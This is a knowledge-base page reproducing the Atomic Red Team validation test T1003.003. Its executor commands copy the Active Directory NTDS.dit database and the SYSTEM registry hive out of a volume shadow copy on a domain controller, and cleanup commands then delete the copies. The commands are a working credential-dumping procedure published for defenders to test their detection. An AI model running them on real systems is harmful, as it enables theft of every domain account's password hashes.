---
atomic_guid: "c6237146-9ea6-4711-85c9-c56d263a6b03"
title: "Copy NTDS.dit from Volume Shadow Copy"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.003"
attack_technique_name: "OS Credential Dumping: NTDS"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml"
build_date: "2026-04-26 14:38:39"
executor: "command_prompt"
aliases:
  - "c6237146-9ea6-4711-85c9-c56d263a6b03"
  - "Copy NTDS.dit from Volume Shadow Copy"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Copy NTDS.dit from Volume Shadow Copy

This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.

This test requires steps taken in the test "Create Volume Shadow Copy with vssadmin".
A successful test also requires the export of the SYSTEM Registry hive.
This test must be executed on a Windows Domain Controller.

## Metadata

- Atomic GUID: c6237146-9ea6-4711-85c9-c56d263a6b03
- Technique: T1003.003: OS Credential Dumping: NTDS
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1003.003/T1003.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.003]]

## Input Arguments

### extract_path

- description: Path for extracted NTDS.dit
- type: path
- default: C:\Windows\Temp

### vsc_name

- description: Name of Volume Shadow Copy
- type: string
- default: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

## Dependencies

Target must be a Domain Controller

### Prerequisite Check

```text
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
```

### Get Prerequisite

```text
echo Sorry, Promoting this machine to a Domain Controller must be done manually
```

Volume shadow copy must exist

### Prerequisite Check

```text
if not exist #{vsc_name} (exit /b 1)
```

### Get Prerequisite

```text
echo Run "Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'" to fulfill this requirement
```

Extract path must exist

### Prerequisite Check

```text
if not exist #{extract_path} (exit /b 1)
```

### Get Prerequisite

```text
mkdir #{extract_path}
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
```

### Cleanup

```commandprompt
del "#{extract_path}\ntds.dit"        >nul 2> nul
del "#{extract_path}\VSC_SYSTEM_HIVE" >nul 2> nul
del "#{extract_path}\SYSTEM_HIVE"     >nul 2> nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml)
